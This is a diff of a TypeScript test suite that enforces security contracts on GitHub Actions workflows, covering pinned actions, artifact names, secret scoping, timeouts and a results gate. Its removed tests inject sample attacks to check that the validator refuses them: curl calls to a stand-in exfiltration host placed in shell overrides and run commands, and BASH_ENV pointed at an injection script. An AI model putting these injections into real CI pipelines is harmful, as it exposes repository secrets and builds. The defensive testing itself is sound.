-        recordAt(jobAt(coverageWrites, 'coverage'), 'permissions').checks = 'write';
-        expect(() => assertSemanticReviewWorkflow(coverageWrites)).toThrow('contents: read alone');
-
-        // The coverage job reads the run's artifact and nothing else. A
-        // checkout — even the trusted revision's — is an action this job must
-        // not hold, and an unpinned downloader is the same supply-chain surface
-        // the assessment job's action list refuses.
-        for (const [label, uses] of [
-            ['a checkout', 'actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1'],
-            ['an unpinned download', 'actions/download-artifact@main'],
-        ] as const) {
-            const wrongAction = structuredClone(semanticReviewWorkflow);
-            stepNamed(jobAt(wrongAction, 'coverage'), 'Download the advisory report').uses = uses;
-            expect(
-                () => assertSemanticReviewWorkflow(wrongAction),
-                `${label} in the coverage job must be refused`
-            ).toThrow('the one pinned action, and no checkout');
-        }
-
-        // The artifact name is what binds the read to this run's own upload; a
-        // widened name can pick up another pull request's report.
-        const widenedArtifact = structuredClone(semanticReviewWorkflow);
-        recordAt(stepNamed(jobAt(widenedArtifact, 'coverage'), 'Download the advisory report'), 'with').name =
-            'semantic-review';
-        expect(() => assertSemanticReviewWorkflow(widenedArtifact)).toThrow('the artifact this run uploaded');
-
-        // A missing artifact is an expected outcome, so the fetch is softened
-        // and the annotating step reports it. Hardening the fetch back turns
-        // that outcome into a red coverage job that says nothing.
-        const hardenedDownload = structuredClone(semanticReviewWorkflow);
-        delete stepNamed(jobAt(hardenedDownload, 'coverage'), 'Download the advisory report')['continue-on-error'];
-        expect(() => assertSemanticReviewWorkflow(hardenedDownload)).toThrow('the softened artifact fetch');
-
-        // A static coverage name reports a check that no longer says anything
-        // about this run's scope, which is the whole product of the job.
-        const staticCoverageName = structuredClone(semanticReviewWorkflow);
-        jobAt(staticCoverageName, 'coverage').name = 'Jev coverage';
-        expect(() => assertSemanticReviewWorkflow(staticCoverageName)).toThrow(
-            'a coverage name built from the assessment output'
-        );
-
-        // Without the dependency the coverage job reads a run that may not
-        // exist, and without the output its name has nothing to carry.
-        const disconnectedCoverage = structuredClone(semanticReviewWorkflow);
-        delete jobAt(disconnectedCoverage, 'coverage').needs;
-        expect(() => assertSemanticReviewWorkflow(disconnectedCoverage)).toThrow('its dependency on the assessment');
-
-        const alwaysCoverage = structuredClone(semanticReviewWorkflow);
-        jobAt(alwaysCoverage, 'coverage').if = 'always()';
-        expect(() => assertSemanticReviewWorkflow(alwaysCoverage)).toThrow('its run-unless-cancelled condition');
-
-        const outputless = structuredClone(semanticReviewWorkflow);
-        delete jobAt(outputless, 'assess').outputs;
-        expect(() => assertSemanticReviewWorkflow(outputless)).toThrow('its coverage and producer-attempt outputs');
-
-        // The producer's attempt is what the consumer names the artifact from, so
-        // dropping it leaves the download naming an artifact no job uploaded on a
-        // re-run of only the failed jobs.
-        const attemptless = structuredClone(semanticReviewWorkflow);
-        delete recordAt(jobAt(attemptless, 'assess'), 'outputs')[SEMANTIC_REVIEW_ARTIFACT_ATTEMPT_OUTPUT];
-        expect(() => assertSemanticReviewWorkflow(attemptless)).toThrow('its coverage and producer-attempt outputs');
-
-        // The computing step keeps the default success gate. A condition that
-        // would let it run after a failed report publishes a line derived from a
-        // report the upload step never published, so the coverage job could only
-        // contradict the name it was given. Both tempting conditions are refused.
-        for (const [label, condition] of [
-            ['a run-unless-cancelled condition', '${{ !cancelled() }}'],
-            ['an always condition', 'always()'],
-        ] as const) {
-            const gatedCoverage = structuredClone(semanticReviewWorkflow);
-            stepNamed(jobAt(gatedCoverage, 'assess'), 'Compute the coverage line').if = condition;
-            expect(
-                () => assertSemanticReviewWorkflow(gatedCoverage),
-                `${label} on the computing step must be refused`
-            ).toThrow('no step condition beyond the job gate');
-        }
-
-        // The fallback belongs in the consumer's name expression. A job that
-        // never ran never evaluates its outputs mapping, so the old placement is
-        // what leaves the name empty on exactly the skipped and red runs it is
-        // meant to describe, and a name without the fallback is empty there too.
-        const fallbackInProducer = structuredClone(semanticReviewWorkflow);
-        recordAt(jobAt(fallbackInProducer, 'assess'), 'outputs').coverage =
-            "${{ steps.coverage.outputs.coverage || 'no assessment delivered' }}";
-        expect(() => assertSemanticReviewWorkflow(fallbackInProducer)).toThrow(
-            'its coverage and producer-attempt outputs'
-        );
-
-        const fallbacklessName = structuredClone(semanticReviewWorkflow);
-        jobAt(fallbacklessName, 'coverage').name = 'Jev coverage · ${{ needs.assess.outputs.coverage }}';
-        expect(() => assertSemanticReviewWorkflow(fallbacklessName)).toThrow(
-            'a coverage name built from the assessment output'
-        );
-
-        // A step's `shell` is executable and no command pin reads it, so a
-        // command appended there runs beside the pinned one with `run` unchanged
-        // — on the step that holds the provider key as much as any other.
-        for (const [jobId, stepName] of [
-            ['assess', 'Assess the change'],
-            ['coverage', 'Publish the withheld paths'],
-        ] as const) {
-            const shellInjection = structuredClone(semanticReviewWorkflow);
-            stepNamed(jobAt(shellInjection, jobId), stepName).shell = 'bash -c "curl -s https://exfil.example"';
-            expect(
-                () => assertSemanticReviewWorkflow(shellInjection),
-                `a shell override on ${jobId} ${stepName} must be refused`
-            ).toThrow('without a shell override');
-        }
-
-        // The rest of the executable-surface class. A workflow- or job-level
-        // `defaults` replaces the shell every `run` step uses, a job or step
-        // `container` re-environments the job that holds the provider key, and a
-        // job or step `env` can set `BASH_ENV` for a command whose text is pinned.
-        // The snapshot is regenerated as a matter of course, so it cannot be the
-        // only pin for any of them.
-        const workflowDefaults = structuredClone(semanticReviewWorkflow);
-        workflowDefaults.defaults = { run: { shell: 'bash -c "curl -s https://exfil.example"' } };
-        expect(() => assertSemanticReviewWorkflow(workflowDefaults)).toThrow('no workflow-level defaults');
-
-        const workflowEnvironment = structuredClone(semanticReviewWorkflow);
-        recordAt(workflowEnvironment, 'env').BASH_ENV = '/tmp/inject.sh';
-        expect(() => assertSemanticReviewWorkflow(workflowEnvironment)).toThrow('its pinned workflow environment');
-
-        for (const jobId of [SEMANTIC_REVIEW_ASSESS_JOB, SEMANTIC_REVIEW_COVERAGE_JOB] as const) {
-            const jobLabel = jobId === SEMANTIC_REVIEW_ASSESS_JOB ? 'the assessment job' : 'the coverage job';
-            for (const [key, value] of [
-                ['defaults', { run: { shell: 'bash -c "curl -s https://exfil.example"' } }],
-                ['container', { image: 'node:24', env: { BASH_ENV: '/tmp/inject.sh' } }],
-                ['env', { BASH_ENV: '/tmp/inject.sh' }],
-            ] as const) {
-                const injected = structuredClone(semanticReviewWorkflow);
-                jobAt(injected, jobId)[key] = value;
-                expect(
-                    () => assertSemanticReviewWorkflow(injected),
-                    `a job ${key} block on ${jobId} must be refused`
-                ).toThrow(`${jobLabel} without a job ${key} block`);
-            }
-        }
-
-        for (const [jobId, stepName] of [
-            [SEMANTIC_REVIEW_ASSESS_JOB, 'Report the assessment'],
-            [SEMANTIC_REVIEW_COVERAGE_JOB, 'Download the advisory report'],
-        ] as const) {
-            const jobLabel = jobId === SEMANTIC_REVIEW_ASSESS_JOB ? 'the assessment job' : 'the coverage job';
-            const containerStep = structuredClone(semanticReviewWorkflow);
-            stepNamed(jobAt(containerStep, jobId), stepName).container = { image: 'node:24' };
-            expect(
-                () => assertSemanticReviewWorkflow(containerStep),
-                `a step container on ${jobId} ${stepName} must be refused`
-            ).toThrow(`${jobLabel} steps without a step container`);
-
-            const envStep = structuredClone(semanticReviewWorkflow);
-            stepNamed(jobAt(envStep, jobId), stepName).env = { BASH_ENV: '/tmp/inject.sh' };
-            expect(
-                () => assertSemanticReviewWorkflow(envStep),
-                `a step env on ${jobId} ${stepName} must be refused`
-            ).toThrow(`${jobLabel} steps without a step environment`);
-        }
-
-        // The annotating step is the one coverage step with a legitimate
-        // environment, and it is pinned whole: a third variable beside the two
-        // it reads is refused.
-        const annotateExtraEnv = structuredClone(semanticReviewWorkflow);
-        recordAt(stepNamed(jobAt(annotateExtraEnv, 'coverage'), 'Publish the withheld paths'), 'env').BASH_ENV =
-            '/tmp/inject.sh';
-        expect(() => assertSemanticReviewWorkflow(annotateExtraEnv)).toThrow(
-            'the retrieval outcome and coverage line alone'
-        );
-
-        // Reordering the same three workflow environment entries changes nothing,
-        // and an empty mapping is the same no-op as an absent declaration, so
-        // neither is a boundary change.
-        const reorderedEnvironment = structuredClone(semanticReviewWorkflow);
-        reorderedEnvironment.env = {
-            TRUSTED_SHA: SEMANTIC_REVIEW_ENV.TRUSTED_SHA,
-            NODE_VERSION: SEMANTIC_REVIEW_ENV.NODE_VERSION,
-            PR_NUMBER: SEMANTIC_REVIEW_ENV.PR_NUMBER,
-        };
-        expect(() => assertSemanticReviewWorkflow(reorderedEnvironment)).not.toThrow();
-
-        const emptyDeclarations = structuredClone(semanticReviewWorkflow);
-        emptyDeclarations.defaults = {};
-        jobAt(emptyDeclarations, SEMANTIC_REVIEW_ASSESS_JOB).defaults = {};
-        jobAt(emptyDeclarations, SEMANTIC_REVIEW_ASSESS_JOB).env = {};
-        jobAt(emptyDeclarations, SEMANTIC_REVIEW_COVERAGE_JOB).defaults = {};
-        jobAt(emptyDeclarations, SEMANTIC_REVIEW_COVERAGE_JOB).env = {};
-        stepNamed(jobAt(emptyDeclarations, SEMANTIC_REVIEW_ASSESS_JOB), 'Report the assessment').env = {};
-        stepNamed(jobAt(emptyDeclarations, SEMANTIC_REVIEW_ASSESS_JOB), 'Report the assessment').container = {};
-        stepNamed(jobAt(emptyDeclarations, SEMANTIC_REVIEW_COVERAGE_JOB), 'Download the advisory report').env = {};
-        expect(() => assertSemanticReviewWorkflow(emptyDeclarations)).not.toThrow();
-
-        // The upload is pinned before the line is computed, and both sides read
-        // one artifact-name constant: an upload that never ran leaves the line
-        // unpublished, and a renamed upload cannot leave the download fetching an
-        // artifact this run never published.
-        const reorderedAssessSteps = structuredClone(semanticReviewWorkflow);
-        swapStepsNamed(
-            jobAt(reorderedAssessSteps, 'assess'),
-            'Upload the advisory report',
-            'Compute the coverage line'
-        );
-        expect(() => assertSemanticReviewWorkflow(reorderedAssessSteps)).toThrow('its complete ordered steps');
-
-        const driftedUploadName = structuredClone(semanticReviewWorkflow);
-        recordAt(stepNamed(jobAt(driftedUploadName, 'assess'), 'Upload the advisory report'), 'with').name =
-            'semantic-review';
-        expect(() => assertSemanticReviewWorkflow(driftedUploadName)).toThrow('the artifact this run publishes');
-
-        // A re-run reuses the run id, so the artifact name must be scoped to the
-        // attempt: a run-scoped name would collide with the previous attempt's
-        // immutable artifact, fail the new upload, leave the line on its
-        // fallback, and still let the softened download read the superseded
-        // report. The producer's attempt is carried as a job output, and the
-        // consumer names the artifact from it: a re-run of only the failed jobs
-        // does not re-run `assess`, so the consumer's own `github.run_attempt`
-        // would name an artifact no job uploaded. All three spellings are
-        // refused, and the pins are asserted to carry the right attempt.
-        expect(SEMANTIC_REVIEW_UPLOAD_ARTIFACT_NAME).toContain('${{ github.run_attempt }}');
-        expect(SEMANTIC_REVIEW_DOWNLOAD_ARTIFACT_NAME).toContain(
-            `\${{ needs.assess.outputs.${SEMANTIC_REVIEW_ARTIFACT_ATTEMPT_OUTPUT} }}`
-        );
-        const runScopedArtifact = structuredClone(semanticReviewWorkflow);
-        recordAt(stepNamed(jobAt(runScopedArtifact, 'assess'), 'Upload the advisory report'), 'with').name =
-            'semantic-review-${{ env.PR_NUMBER }}-${{ github.run_id }}';
-        expect(() => assertSemanticReviewWorkflow(runScopedArtifact)).toThrow('the artifact this run publishes');
-
-        const runScopedDownload = structuredClone(semanticReviewWorkflow);
-        recordAt(stepNamed(jobAt(runScopedDownload, 'coverage'), 'Download the advisory report'), 'with').name =
-            'semantic-review-${{ env.PR_NUMBER }}-${{ github.run_id }}';
-        expect(() => assertSemanticReviewWorkflow(runScopedDownload)).toThrow('the artifact this run uploaded');
-
-        const consumerAttemptDownload = structuredClone(semanticReviewWorkflow);
-        recordAt(stepNamed(jobAt(consumerAttemptDownload, 'coverage'), 'Download the advisory report'), 'with').name =
-            'semantic-review-${{ env.PR_NUMBER }}-${{ github.run_id }}-${{ github.run_attempt }}';
-        expect(() => assertSemanticReviewWorkflow(consumerAttemptDownload)).toThrow('the artifact this run uploaded');
-
-        // The setup actions' inputs decide what the pinned commands run on;
-        // nothing else reads them, so the Node version is pinned by name and not
-        // only by the regenerable snapshot.
-        const driftedNode = structuredClone(semanticReviewWorkflow);
-        recordAt(stepNamed(jobAt(driftedNode, 'assess'), 'Set up Node'), 'with')['node-version'] = '24.19.1';
-        expect(() => assertSemanticReviewWorkflow(driftedNode)).toThrow('the Node version the assessment runs on');
-
-        const pnpmInputs = structuredClone(semanticReviewWorkflow);
-        stepNamed(jobAt(pnpmInputs, 'assess'), 'Set up pnpm').with = { version: '11' };
-        expect(() => assertSemanticReviewWorkflow(pnpmInputs)).toThrow('no inputs on the pnpm setup step');
-
-        // The output is read through the step id, so an id that drifts leaves
-        // the job output empty while the step still runs.
-        const wrongId = structuredClone(semanticReviewWorkflow);
-        stepNamed(jobAt(wrongId, 'assess'), 'Compute the coverage line').id = 'line';
-        expect(() => assertSemanticReviewWorkflow(wrongId)).toThrow('the output id its own output is read from');
-
-        // The annotating step was pinned by command, so any appended command
-        // would keep the check name and stop it meaning what it says.
-        const exfiltratingCoverage = structuredClone(semanticReviewWorkflow);
-        const annotate = stepNamed(jobAt(exfiltratingCoverage, 'coverage'), 'Publish the withheld paths');
-        annotate.run = `${String(annotate.run)}curl -s "https://exfil.example"`;
-        expect(() => assertSemanticReviewWorkflow(exfiltratingCoverage)).toThrow(
-            'exactly the pinned annotating command'
-        );
-
-        // The provider key is scoped to the assessment step alone, so the same
-        // credential on the coverage job is refused by the workflow-wide count
-        // however the variable is named.
-        const keyInCoverage = structuredClone(semanticReviewWorkflow);
-        stepNamed(jobAt(keyInCoverage, 'coverage'), 'Publish the withheld paths').env = {
-            [SEMANTIC_REVIEW_KEY_ENV]: SEMANTIC_REVIEW_KEY_SECRET_EXPRESSION,
-        };
-        expect(() => assertSemanticReviewWorkflow(keyInCoverage)).toThrow(
-            'must mention a repository secret exactly once, on the assessment step'
-        );
-    });
-
-    // The `file=` property is identity-bearing, so a control character must be
-    // escaped there, never folded: folding a newline into a space would annotate
-    // a control-character sibling under a real space-named path and attribute
-    // its reason to the wrong file. The shipped commands are executed on exactly
-    // that report, and both properties must come back exact.
-    it('keeps the emitted file property exact beside a real space-named path', () => {
-        const report = JSON.stringify({
-            execution: 'partial',
-            scope: {
-                discovered: 2,
-                eligible: 2,
-                assessed: 0,
-                cacheHits: 0,
-                excluded: [],
-                unassessed: [
-                    { path: 'src/one two.ts', reason: 'budget-exhausted-before-admission' },
-                    { path: 'src/one\ntwo.ts', reason: 'evidence-withheld-sensitive-path' },
-                ],
-                truncated: [],
-            },
-        });
-        const { coverage, notices, status } = runSemanticCoverageLine({ report });
-        expect(status).toBe(0);
-        expect(coverage).toContain('2 distinct path-and-reason pairs');
-        const annotations = notices.split('\n').filter((line) => line.startsWith('::notice file='));
-        expect(annotations).toHaveLength(2);
-        expect(annotations.join('\n')).toContain('file=src/one two.ts,line=1::src/one two.ts: ');
-        expect(annotations.join('\n')).toContain('file=src/one%0Atwo.ts,line=1::src/one%0Atwo.ts: ');
-        expect(annotations.join('\n')).toContain('budget-exhausted-before-admission');
-        expect(annotations.join('\n')).toContain('evidence-withheld-sensitive-path');
-        expect(notices).toContain('0 further distinct path-and-reason pairs were not annotated.');
-    });
-
-    // A path routinely carries more than one reason, so a per-path budget would
-    // let a milder reason hide a sensitive one and then report that nothing
-    // further was withheld. Each distinct path-and-reason pair is annotated, the
-    // budget is spent on pairs, and the remainder is counted in the same unit.
-    it('annotates every distinct reason a withheld path carries within the ten-entry budget', () => {
-        const otherPaths = Array.from({ length: 10 }, (_, index) => ({
-            path: `src/other-${String(index)}.ts`,
-            reason: 'no-admissible-evidence',
-        }));
-        const report = JSON.stringify({
-            execution: 'partial',
-            scope: {
-                discovered: 12,
-                eligible: 12,
-                assessed: 0,
-                cacheHits: 0,
-                excluded: [],
-                unassessed: [
-                    { path: 'src/repeated.ts', reason: 'evidence-withheld-sensitive-path' },
-                    { path: 'src/repeated.ts', reason: 'budget-exhausted-before-admission' },
-                    ...otherPaths,
-                ],
-                truncated: [],
-            },
-        });
-        const { coverage, notices, status } = runSemanticCoverageLine({ report });
-        expect(status).toBe(0);
-        expect(coverage).toContain('12 distinct path-and-reason pairs');
-        const annotations = notices.split('\n').filter((line) => line.startsWith('::notice file='));
-        expect(annotations).toHaveLength(10);
-        expect(annotations.join('\n')).toContain('file=src/repeated.ts,line=1::src/repeated.ts: ');
-        expect(annotations.join('\n')).toContain('evidence-withheld-sensitive-path');
-        expect(annotations.join('\n')).toContain('budget-exhausted-before-admission');
-        expect(notices).toContain('2 further distinct path-and-reason pairs were not annotated.');
-    });
-
-    // The producer emits one identical path-and-reason entry per over-budget
-    // region of a file, so twelve over-budget hunks of one file are one notice,
-    // not twelve. Identical pairs collapse, every distinct reason stays, and the
-    // trailing notice counts the pairs it did not annotate.
-    it('collapses identical withheld pairs while keeping a distinct reason', () => {
-        const identicalRegions = Array.from({ length: 12 }, () => ({
-            path: 'src/hunks.ts',
-            reason: 'region-exceeds-per-region-budget (after)',
-        }));
-        const report = JSON.stringify({
-            execution: 'partial',
-            scope: {
-                discovered: 13,
-                eligible: 13,
-                assessed: 0,
-                cacheHits: 0,
-                excluded: [],
-                unassessed: [...identicalRegions, { path: 'src/hunks.ts', reason: 'evidence-withheld-sensitive-path' }],
-                truncated: [],
-            },
-        });
-        const { coverage, notices, status } = runSemanticCoverageLine({ report });
-        expect(status).toBe(0);
-        expect(coverage).toContain('2 distinct path-and-reason pairs');
-        const annotations = notices.split('\n').filter((line) => line.startsWith('::notice file='));
-        expect(annotations).toHaveLength(2);
-        expect(annotations.join('\n')).toContain('region-exceeds-per-region-budget (after)');
-        expect(annotations.join('\n')).toContain('evidence-withheld-sensitive-path');
-        expect(notices).toContain('0 further distinct path-and-reason pairs were not annotated.');
-    });
-
-    // Three absences that must not read the same. A failed fetch with a line is
-    // a report this run published but could not retrieve; a failed fetch with no
-    // line is a run that published nothing at all; a successful fetch with no
-    // readable report disproves "published nothing" and is its own case. The
-    // never-published branch is exercised with a failed fetch and an empty line,
-    // because a successful download would prove it wrong.
-    it('tells a failed retrieval, a never-published run, and an unreadable report apart', () => {
-        const retrievalFailure = runSemanticCoverageLine({
-            downloadOutcome: 'failure',
-            coverageLine: 'partial · 1 discovered · 1 eligible · 0 assessed · 1 distinct path-and-reason pair',
-        });
-        expect(retrievalFailure.notices).toContain('could not be retrieved');
-        expect(retrievalFailure.notices).not.toContain('No coverage was reported');
-        expect(retrievalFailure.notices).not.toContain('could not be read');
-
-        const neverPublished = runSemanticCoverageLine({ downloadOutcome: 'failure', coverageLine: '' });
-        expect(neverPublished.notices).toContain('No coverage was reported');
-        expect(neverPublished.notices).not.toContain('could not be retrieved');
-        expect(neverPublished.notices).not.toContain('could not be read');
-
-        const emptyArtifact = runSemanticCoverageLine({ downloadOutcome: 'success' });
-        expect(emptyArtifact.notices).toContain('could not be read');
-        expect(emptyArtifact.notices).not.toContain('No coverage was reported');
-        expect(emptyArtifact.notices).not.toContain('could not be retrieved');
-
-        const emptyReport = runSemanticCoverageLine({ report: '', downloadOutcome: 'success' });
-        expect(emptyReport.notices).toContain('could not be read');
-        expect(emptyReport.notices).not.toContain('No coverage was reported');
-    });
     afterEach(() => {
         vi.unstubAllGlobals();
     });
@@ -3763,6 +3217,58 @@ describe('health gates workflow contract', () => {
         );
     });
 
+    it('acquires only trusted scanner files and starts from the pinned target instead of every ref', () => {
+        const job = jobAt(validationWorkflow, 'pr-secrets');
+        const trusted = recordAt(stepNamed(job, 'Checkout trusted scanner'), 'with');
+        expect(trusted['sparse-checkout']).toBe('/.gitleaks.toml\n/.gitleaksignore\n');
+        expect(trusted['sparse-checkout-cone-mode']).toBe(false);
+        expect(recordAt(stepNamed(job, 'Checkout scan target'), 'with')['fetch-depth']).toBe(1);
+        expect(job['timeout-minutes']).toBe(10);
+    });
+
+    it('acquires the exact complete pinned commit and merge-parent patch set despite moved and unrelated refs', () => {
+        withPrSecretHistory((fixture) => {
+            const { directory, result } = acquirePrSecretHistory(fixture, validationWorkflow);
+            expect(result.error).toBeUndefined();
+            expect(result.status, result.stderr).toBe(0);
+            expect(fixtureGit(directory, ['rev-parse', '--is-shallow-repository'])).toBe('false');
+            const range = `${fixture.base}..${fixture.head}`;
+            const args = ['log', '--format=%H:%P', '-p', '-U0', range, '-m'];
+            const expected = fixtureGit(fixture.source, args);
+            expect(expected).toContain('intermediate.txt');
+            expect(expected).toContain('side.txt');
+            expect(expected).toContain('+aws_access_key_id');
+            expect(expected).not.toContain('excluded-common.txt');
+            expect(expected).not.toContain('moved-head.txt');
+            expect(fixtureGit(directory, args)).toBe(expected);
+            expect(fixtureGit(directory, ['for-each-ref', '--format=%(refname)'])).toBe('');
+            expect(fixtureGit(directory, ['rev-parse', 'HEAD'])).toBe(fixture.head);
+        });
+    });
+
+    it.each(['base', 'head'] as const)('refuses a missing pinned %s before the scan', (endpoint) => {
+        withPrSecretHistory((fixture) => {
+            const { result } = acquirePrSecretHistory(fixture, validationWorkflow, { [endpoint]: 'f'.repeat(40) });
+            expect(result.error).toBeUndefined();
+            expect(result.status).not.toBe(0);
+        });
+    });
+
+    it('refuses a remaining shallow boundary if history acquisition is omitted', () => {
+        withPrSecretHistory((fixture) => {
+            const script = stringAt(
+                stepNamed(jobAt(validationWorkflow, 'pr-secrets'), 'Fetch immutable base SHA'),
+                'run'
+            );
+            const { result } = acquirePrSecretHistory(fixture, validationWorkflow, {
+                depth: 1,
+                run: script.replaceAll(/git fetch[^\n]+/g, ':'),
+            });
+            expect(result.error).toBeUndefined();
+            expect(result.status).not.toBe(0);
+        });
+    });
+
     it('gives every pull request an offline smoke set and a diff secret scan', () => {
         expect(() => assertOfflineSmokeJob(validationWorkflow)).not.toThrow();
         expect(() => assertPullRequestSecretScan(validationWorkflow)).not.toThrow();
@@ -4060,10 +3566,44 @@ describe('health gates workflow contract', () => {
         expect(() => assertStepInventory(dropped)).toThrow('nightly.yml job static steps drifted');
     });
 
+    it('admits the observed fetch plus full checkout while reserving lint and cleanup phases', () => {
+        const lint = jobAt(validationWorkflow, 'lint');
+        const checkout = stepNamed(lint, 'Checkout');
+        const checkoutMinutes = checkout['timeout-minutes'];
+        if (typeof checkoutMinutes !== 'number') {
+            throw new TypeError('checkout must declare its phase budget');
+        }
+        // Run40743393214 fetched for 298.736s before its five-minute step expired in checkout.
+        // Its parallel full checkout took 7.049s after fetching; neither phase may be omitted.
+        const observedFetchMs = 298_736;
+        const completedPeerCheckoutMs = 7_049;
+        expect(checkoutMinutes * 60_000).toBeGreaterThanOrEqual(observedFetchMs + completedPeerCheckoutMs);
+        expect(checkout.with).toBeUndefined();
+
+        let reservedStepMinutes = 0;
+        for (const name of ['Checkout', 'Set up pnpm', 'Set up Node', 'Install dependencies', 'Lint']) {
+            const minutes = stepNamed(lint, name)['timeout-minutes'];
+            if (typeof minutes !== 'number') {
+                throw new TypeError(`lint phase ${name} must declare its budget`);
+            }
+            reservedStepMinutes += minutes;
+        }
+        const jobMinutes = lint['timeout-minutes'];
+        if (typeof jobMinutes !== 'number') {
+            throw new TypeError('lint must declare its outer budget');
+        }
+        expect(jobMinutes - reservedStepMinutes).toBeGreaterThanOrEqual(5);
+        expect(stepNamed(lint, 'Lint')['timeout-minutes']).toBe(20);
+        expect(stepNamed(lint, 'Lint').run).toBe('pnpm lint:full');
+    });
+
     it('reserves bounded setup, full lint, and cleanup time in the lint job', () => {
         expect(() => assertLintTimeBudgets(validationWorkflow)).not.toThrow();
+        const oldCheckout = structuredClone(validationWorkflow);
+        stepNamed(jobAt(oldCheckout, 'lint'), 'Checkout')['timeout-minutes'] = 5;
+        expect(() => assertLintTimeBudgets(oldCheckout)).toThrow('ten-minute timeout');
         const oldJob = structuredClone(validationWorkflow);
-        jobAt(oldJob, 'lint')['timeout-minutes'] = 20;
+        jobAt(oldJob, 'lint')['timeout-minutes'] = 45;
         expect(() => assertLintTimeBudgets(oldJob)).toThrow('five minutes for cleanup');
         for (const name of ['Checkout', 'Set up pnpm', 'Set up Node', 'Install dependencies', 'Lint']) {
             const missing = structuredClone(validationWorkflow);
@@ -4071,7 +3611,7 @@ describe('health gates workflow contract', () => {
             expect(() => assertLintTimeBudgets(missing), name).toThrow();
         }
         const overlong = structuredClone(validationWorkflow);
-        jobAt(overlong, 'lint')['timeout-minutes'] = 46;
+        jobAt(overlong, 'lint')['timeout-minutes'] = 51;
         expect(() => assertLintTimeBudgets(overlong)).toThrow('five minutes for cleanup');
         const lint = jobAt(validationWorkflow, 'lint');
         expect(lint.if).toBe("needs.decide.outputs.code == 'true'");
@@ -5239,6 +4779,7 @@ describe('health gates workflow contract', () => {
         const step = stepNamed(gate, 'Require selected validation jobs to succeed');
         expect(step.if).toBe(GATE_CONDITION);
         expect(recordAt(step, 'env').RESULTS).toBe('${{ toJSON(needs) }}');
+        expect(recordAt(step, 'env').MODE).toBe('${{ inputs.mode }}');
         const script = stringAt(step, 'run');
         const scope = runScopeScript(assertScopeContract(validationWorkflow), 'pull_request', {
             PROFILE: 'tooling',
@@ -5254,7 +4795,8 @@ describe('health gates workflow contract', () => {
             ])
         );
         results.decide = { result: 'success', outputs: scope };
-        const run = (value: unknown) => runResultsGuard(script, JSON.stringify(value), { PULL_REQUEST: 'true' });
+        const run = (value: unknown) =>
+            runResultsGuard(script, JSON.stringify(value), { PULL_REQUEST: 'true', MODE: 'full' });
         expect(run(results)).toBe(0);
         for (const outcome of ['failure', 'cancelled', 'skipped'] as const) {
             expect(run({ ...results, 'tooling-unit': { result: outcome } })).not.toBe(0);
@@ -5263,6 +4805,48 @@ describe('health gates workflow contract', () => {
         delete missing['tooling-unit'];
         expect(run(missing)).not.toBe(0);
         expect(run({ ...results, unit: { result: 'success' } })).not.toBe(0);
+        const broadScope = runScopeScript(assertScopeContract(validationWorkflow), 'pull_request', {
+            RUST: 'true',
+            SERVER: 'true',
+            WEB: 'true',
+            BROWSER: 'true',
+        });
+        const broadSelected = new Set(selectedPrValidationJobs(broadScope));
+        const full: Record<string, { result: string; outputs?: UnknownRecord }> = Object.fromEntries(
+            VALIDATION_JOBS.filter((job) => job !== 'validation-gate').map((job) => [
+                job,
+                { result: broadSelected.has(job) ? 'success' : 'skipped' },
+            ])
+        );
+        full.decide = { result: 'success', outputs: broadScope };
+        expect(run(full)).toBe(0);
+        const broadJobs = ['unit', 'build', 'rust', 'native-macos', 'native-windows', 'native-parity'];
+        for (const job of broadJobs) {
+            for (const outcome of ['failure', 'cancelled', 'skipped']) {
+                expect(run({ ...full, [job]: { result: outcome } })).not.toBe(0);
+            }
+            const missingJob = { ...full };
+            delete missingJob[job];
+            expect(run(missingJob)).not.toBe(0);
+        }
+        const preliminary = { ...full, ...Object.fromEntries(broadJobs.map((job) => [job, { result: 'skipped' }])) };
+        const runMode = (value: unknown, mode: string) =>
+            runResultsGuard(script, JSON.stringify(value), { PULL_REQUEST: 'true', MODE: mode });
+        expect(runMode(preliminary, 'preliminary')).toBe(0);
+        expect(runMode({ ...preliminary, lint: { result: 'failure' } }, 'preliminary')).not.toBe(0);
+        expect(runMode({ ...preliminary, unit: { result: 'success' } }, 'preliminary')).not.toBe(0);
+        for (const mode of ['', 'invalid']) {
+            expect(runMode(full, mode)).not.toBe(0);
+            expect(() =>
+                runScopeScript(assertScopeContract(validationWorkflow), 'pull_request', { MODE: mode })
+            ).toThrow();
+        }
+        const wrongRequiredMode = cloneWorkflows('preliminary required validation');
+        recordAt(jobAt(wrongRequiredMode.health, 'validation'), 'with').mode = 'preliminary';
+        expect(() => assertJobGraph(wrongRequiredMode)).toThrow();
+        const missingRequiredMode = cloneWorkflows('missing required validation mode');
+        delete recordAt(jobAt(missingRequiredMode.health, 'validation'), 'with').mode;
+        expect(() => assertJobGraph(missingRequiredMode)).toThrow();
     });
 
     it('runs a trusted, credentialless scanner over the untrusted target history', () => {
